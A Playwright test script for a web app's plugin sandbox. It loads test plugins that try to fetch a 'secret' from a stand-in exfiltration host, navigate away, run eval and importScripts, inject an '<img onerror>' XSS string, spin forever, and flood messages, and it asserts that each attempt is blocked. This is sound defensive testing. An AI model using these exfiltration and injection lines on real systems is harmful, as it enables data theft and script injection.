import { chromium } from "playwright";
import assert from "node:assert/strict";
import { createServer } from "node:http";
import { readFile } from "node:fs/promises";
import { pluginWorkerSource } from "../web/src/plugins/sdk.ts";
const html = await readFile(
    new URL("../web/public/plugin-sandbox.html", import.meta.url),
  ),
  script = await readFile(
    new URL("../web/public/plugin-sandbox.js", import.meta.url),
  );
const csp =
  "default-src 'none'; script-src 'self'; style-src 'unsafe-inline' data:; img-src data: blob:; font-src data:; connect-src 'none'; worker-src blob:; frame-src 'none'; frame-ancestors 'self'; form-action 'none'; base-uri 'none'";
const server = createServer((req, res) => {
  if (req.url === "/plugin-sandbox.html") {
    res.setHeader("Content-Type", "text/html");
    res.setHeader("Content-Security-Policy", csp);
    res.setHeader("X-Frame-Options", "SAMEORIGIN");
    res.end(html);
  } else if (req.url === "/plugin-sandbox.js") {
    res.setHeader("Content-Type", "text/javascript");
    res.end(script);
  } else {
    res.setHeader("Content-Type", "text/html");
    res.setHeader(
      "Content-Security-Policy",
      "default-src 'self'; script-src 'self'; frame-ancestors 'none'",
    );
    res.end(
      '<main><iframe title="테스트 확장" sandbox="allow-scripts"></iframe></main>',
    );
  }
});
await new Promise((resolve) => server.listen(0, "127.0.0.1", resolve));
const base = "http://127.0.0.1:" + server.address().port;
const browser = await chromium.launch({ headless: true });
try {
  const page = await browser.newPage(),
    nonce = "1234567890abcdef1234567890abcdef",
    errors = [];
  page.on("console", (m) => {
    if (m.type() === "error") errors.push(m.text());
  });
  page.on("pageerror", (e) => errors.push(e.message));
  await page.goto(base);
  await page.evaluate((nonce) => {
    window.events = [];
    addEventListener("message", (event) => {
      window.events.push(event.data);
      const frame = document.querySelector("iframe");
      if (event.source === frame.contentWindow && event.data?.type === "ready")
        frame.contentWindow.postMessage(
          {
            channel: "madi-plugin-v1",
            nonce,
            type: "init",
            workerSource: window.workerSource,
            context: {
              manifest: { contributions: {} },
              capabilities: [],
              assets: {},
            },
          },
          "*",
        );
    });
  }, nonce);
  async function load(source) {
    const workerSource = pluginWorkerSource(
      nonce,
      Buffer.from(source).toString("base64"),
    );
    await page.evaluate(
      ({ workerSource, nonce }) => {
        window.workerSource = workerSource;
        window.events = [];
        const old = document.querySelector("iframe"),
          frame = document.createElement("iframe");
        frame.title = "테스트 확장";
        frame.sandbox = "allow-scripts";
        old.replaceWith(frame);
        frame.src = "/plugin-sandbox.html#" + nonce;
      },
      { workerSource, nonce },
    );
  }
  await load(
    '(async()=>{await madi.ready();madi.ui.render({type:"stack",children:[{type:"heading",text:"격리된 확장"},{type:"text",text:"DOM 접근: "+typeof document},{type:"button",text:"동작 확인",onClick:()=>madi.ui.render({type:"text",text:"선언형 이벤트 정상"})}]});})();',
  );
  const frame = page.frameLocator("iframe");
  await frame
    .getByRole("heading", { name: "격리된 확장" })
    .waitFor({ timeout: 10000 });
  assert.equal(await frame.getByText("DOM 접근: undefined").count(), 1);
  await frame.getByRole("button", { name: "동작 확인" }).click();
  await frame.getByText("선언형 이벤트 정상").waitFor();
  assert.deepEqual(errors, []);
  let networkAttempts = 0;
  await page.route("https://plugin-exfil.invalid/**", (route) => {
    networkAttempts++;
    return route.abort();
  });
  await load(
    '(async()=>{await madi.ready();const checks={dom:typeof document,window:typeof window,fetchBlocked:false,evalBlocked:false,importBlocked:false};try{await fetch("https://plugin-exfil.invalid/secret")}catch{checks.fetchBlocked=true}try{eval("1+1")}catch{checks.evalBlocked=true}try{importScripts("data:text/javascript,self.injected=true")}catch{checks.importBlocked=true}self.location.href="https://plugin-exfil.invalid/navigation";checks.locationUnchanged=self.location.href.startsWith("blob:");madi.ui.render({type:"stack",children:[{type:"code",text:JSON.stringify(checks)},{type:"text",text:"<img src=x onerror=alert(1)>"}]})})();',
  );
  await frame.locator("pre").waitFor();
  assert.deepEqual(JSON.parse(await frame.locator("pre").innerText()), {
    dom: "undefined",
    window: "undefined",
    fetchBlocked: true,
    evalBlocked: true,
    importBlocked: true,
    locationUnchanged: true,
  });
  assert.equal(networkAttempts, 0);
  assert.equal(await frame.locator("img").count(), 0);
  await load("(async()=>{await madi.ready();while(true){}})();");
  await page.waitForFunction(
    () =>
      window.events.some(
        (event) => event.type === "plugin-error" && event.error.includes("4초"),
      ),
    {},
    { timeout: 8000 },
  );
  await load(
    '(async()=>{await madi.ready();for(let i=0;i<200;i++)postMessage({channel:"madi-plugin-v1",nonce:self.MADI_NONCE,type:"request",id:String(i),operation:"documents.list",args:{}})})();',
  );
  await page.waitForFunction(
    () =>
      window.events.some(
        (event) =>
          event.type === "plugin-error" && event.error.includes("100회"),
      ),
    {},
    { timeout: 5000 },
  );
  console.log(
    "PASS: production CSP sandbox, declarative UI/events, blocked DOM/network/eval/import/navigation, literal HTML, CPU watchdog and message flood termination",
  );
} finally {
  await browser.close();
  await new Promise((resolve) => server.close(resolve));
}
